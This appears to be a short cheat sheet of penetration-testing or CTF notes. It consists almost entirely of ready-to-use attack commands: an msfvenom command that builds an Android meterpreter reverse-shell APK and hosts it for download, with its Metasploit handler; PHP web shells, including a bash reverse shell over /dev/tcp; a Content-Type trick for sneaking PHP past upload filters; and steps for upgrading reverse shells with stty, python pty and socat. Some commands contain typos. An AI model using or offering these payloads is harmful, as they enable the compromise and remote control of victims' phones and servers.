# Android 

## Msfvenom

```bash

msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=9009 R> /var/www/html/ehacking.apk

```
start apache

```bash
service apache2 start 
```

start msfconsole 

```bash
msf> use multi/hundler

msf> set payload android/meterpreter/reverse_tcp

msf> set LPORT 9009

msf> set LHOST <your ip>

msf> exploit 
```

# PHP :

```php 
# shell 
<?php echo (system($_GET['tz']));?>
<?php echo(file_getcontents('flag.php'));?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$IP/$prot 0>&1'"); ?>

```
## upload php 
```
Content-Type: application/x-php
# to 

Content-Type: image/png
```
# STTY

```sh
###Using stty options###

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/sh")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols> 
(which can be checked with "stty -a")




###Using Python for a psuedo terminal###

python -c 'import pty; pty.spawn("/bin/bash")'

###Using socat###

#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

```

# Hardware

```bash
lscpu
head -n 20 /proc/cpuinfo
fdisk -l
lsmod
lsblk
lsusb
lscpi -k
free -m && free -g
```








